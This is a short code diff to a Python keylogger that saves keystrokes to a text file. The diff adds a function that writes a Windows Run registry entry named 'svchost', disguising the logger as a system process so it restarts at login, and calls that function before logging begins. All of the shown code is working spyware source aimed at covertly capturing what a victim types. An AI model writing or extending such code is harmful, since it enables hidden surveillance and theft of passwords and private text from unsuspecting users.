@@ -3,6 +3,11 @@ from datetime import datetime
 
 file = 'keystrokes.txt'
 
+def addstartup():
+    StartupKey = OpenKey(HKEY_CURRENT_USER, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',0, KEY_ALL_ACCESS)
+    SetValueEx(StartupKey, 'svchost', 0, REG_SZ, argv[0])
+    CloseKey(StartupKey)
+
 map = {'backspace':0x08,
            'tab':0x09,
            'clear':0x0C,
@@ -163,4 +168,5 @@ def logging():
                 Sleep(100)
 
 if __name__ == '__main__':
+    addstartup()       
     logging()
